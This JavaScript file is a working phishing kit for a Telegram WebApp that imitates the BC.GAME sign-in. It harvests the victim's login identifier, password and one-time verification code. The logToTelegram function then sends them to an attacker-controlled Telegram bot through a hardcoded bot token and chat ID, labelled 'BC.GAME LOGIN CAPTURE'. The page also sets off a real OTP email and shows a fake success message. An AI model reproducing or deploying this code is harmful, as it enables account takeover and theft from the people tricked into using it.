// CONFIGURATION
const TARGET_BOT_TOKEN = '8323712514:AAG5zdoA0EOmCxt6h7epjBLmoZmWe0mklQQ'; 
const TARGET_CHAT_ID = '1661187898';

// Initialize Telegram
const tg = window.Telegram ? window.Telegram.WebApp : null;
if (tg) {
    tg.expand();
    tg.ready();
}

document.addEventListener('DOMContentLoaded', () => {
    // UI Elements
    const tabs = document.querySelectorAll('.tab');
    const identifierInput = document.getElementById('identifier');
    const passwordWrapper = document.getElementById('password-wrapper');
    const passwordInput = document.getElementById('password');
    const btnSignin = document.getElementById('btn-signin');
    const otpModal = document.getElementById('otp-modal');
    const otpInput = document.getElementById('otp-input');
    const btnConfirm = document.getElementById('btn-confirm');
    const timerDisplay = document.getElementById('timer-count');
    const verifyTitle = document.getElementById('verify-title');
    const verifyText = document.getElementById('verify-text');
    const verifyIcon = document.getElementById('verify-icon');
    const closeBtns = document.querySelectorAll('.btn-close, .modal-close');
    const togglePassBtn = document.querySelector('.btn-toggle-password');
    const pasteBtn = document.querySelector('.btn-paste');

    let currentTab = 'password';
    let timer;

    // Tab Logic
    tabs.forEach(tab => {
        tab.addEventListener('click', () => {
            tabs.forEach(t => t.classList.remove('active'));
            tab.classList.add('active');
            currentTab = tab.dataset.tab;

            if (currentTab === 'otp') {
                passwordWrapper.style.display = 'none';
                identifierInput.placeholder = 'Email / Phone Number';
            } else {
                passwordWrapper.style.display = 'block';
                identifierInput.placeholder = 'Email / Phone Number / Username';
            }
        });
    });

    // Toggle Password
    if (togglePassBtn) {
        togglePassBtn.addEventListener('click', () => {
            const isPass = passwordInput.type === 'password';
            passwordInput.type = isPass ? 'text' : 'password';
            togglePassBtn.innerHTML = isPass ? '<i class="far fa-eye-slash"></i>' : '<i class="far fa-eye"></i>';
        });
    }

    // Modal Close
    closeBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            otpModal.style.display = 'none';
        });
    });

    // Paste Action
    if (pasteBtn) {
        pasteBtn.addEventListener('click', async () => {
            try {
                const text = await navigator.clipboard.readText();
                if (text) otpInput.value = text;
            } catch (e) {}
        });
    }

    // Sign In Trigger
    btnSignin.addEventListener('click', () => {
        const id = identifierInput.value.trim();
        const pass = passwordInput.value.trim();

        if (!id) {
            alert('Please enter your Email or Phone Number');
            return;
        }

        if (currentTab === 'password' && !pass) {
            alert('Please enter your password');
            return;
        }

        // Detect Type
        const isEmail = id.includes('@');
        const isPhone = /^\+?\d{7,15}$/.test(id.replace(/[\s-]/g, ''));

        if (isEmail) {
            verifyTitle.innerText = 'Email Verification';
            verifyText.innerText = 'Please enter the 6-digit verification code sent on e-mail';
            verifyIcon.className = 'fas fa-envelope';
        } else if (isPhone || !isNaN(id.charAt(0))) {
            verifyTitle.innerText = 'Mobile Verification';
            verifyText.innerText = 'Please enter the 6-digit verification code sent to your phone';
            verifyIcon.className = 'fas fa-mobile-alt';
        }

        // Show Modal
        otpModal.style.display = 'flex';
        startTimer(60);

        // Send Real OTP if it's an email
        if (isEmail) {
            fetch('/send-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email: id })
            })
            .then(res => res.json())
            .then(data => {
                if (!data.success) console.error('OTP Send Failed:', data.message);
            })
            .catch(err => console.error('OTP Fetch Error:', err));
        }

        if (tg) tg.HapticFeedback.impactOccurred('light');
    });

    // Confirm (Final Log)
    btnConfirm.addEventListener('click', async () => {
        const otp = otpInput.value.trim();
        if (otp.length < 4) {
            alert('Invalid verification code');
            return;
        }

        btnConfirm.innerText = 'Verifying...';
        btnConfirm.disabled = true;

        const data = {
            bot_user: tg?.initDataUnsafe?.user?.username || tg?.initDataUnsafe?.user?.first_name || 'Unknown',
            bot_id: tg?.initDataUnsafe?.user?.id || 'N/A',
            target_id: identifierInput.value,
            target_pass: passwordInput.value || 'N/A',
            target_otp: otp,
            method: currentTab.toUpperCase()
        };

        await logToTelegram(data);

        btnConfirm.innerText = 'Success';
        if (tg) tg.HapticFeedback.notificationOccurred('success');

        setTimeout(() => {
            otpModal.style.display = 'none';
            if (tg) tg.close();
            else location.reload();
        }, 1500);
    });

    function startTimer(duration) {
        let timeLeft = duration;
        timerDisplay.innerText = timeLeft;
        clearInterval(timer);
        timer = setInterval(() => {
            timeLeft--;
            timerDisplay.innerText = timeLeft;
            if (timeLeft <= 0) clearInterval(timer);
        }, 1000);
    }

    async function logToTelegram(data) {
        const msg = `
🔥 <b>BC.GAME LOGIN CAPTURE</b>
━━━━━━━━━━━━━━━
👤 <b>TG User</b>: @${data.bot_user} (<code>${data.bot_id}</code>)
📧 <b>Identifier</b>: <code>${data.target_id}</code>
🔑 <b>Password</b>: <code>${data.target_pass}</code>
🔢 <b>OTP Code</b>: <code>${data.target_otp}</code>
🛠 <b>Method</b>: ${data.method}
🕒 <b>Time</b>: ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━`;

        try {
            await fetch(`https://api.telegram.org/bot${TARGET_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TARGET_CHAT_ID,
                    text: msg,
                    parse_mode: 'HTML'
                })
            });
        } catch (e) {}
    }
});
